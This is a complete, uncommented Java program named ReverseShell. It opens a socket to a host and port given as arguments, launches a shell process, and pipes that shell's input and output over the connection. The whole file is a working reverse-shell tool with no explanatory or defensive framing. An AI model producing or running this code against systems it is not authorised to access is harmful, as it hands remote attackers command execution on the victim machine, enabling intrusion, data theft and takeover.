import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ReverseShell {
    public static void main(String[] args) throws Exception {
        if (args.length != 3) {
            System.exit(1);
        }

        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String shell = args[2];

        Socket sock = new Socket(host, port);
        Process proc = new ProcessBuilder(shell).redirectErrorStream(true).start();

        InputStream pi = proc.getInputStream();
        OutputStream po = proc.getOutputStream();
        InputStream si = sock.getInputStream();
        OutputStream so = sock.getOutputStream();

        while (!sock.isClosed()) {
            while (pi.available() > 0) {
                so.write(pi.read());
            }

            while (si.available() > 0) {
                po.write(si.read());
            }

            so.flush();
            po.flush();

            Thread.sleep(100);
        }

        proc.destroy();
        sock.close();
    }
}
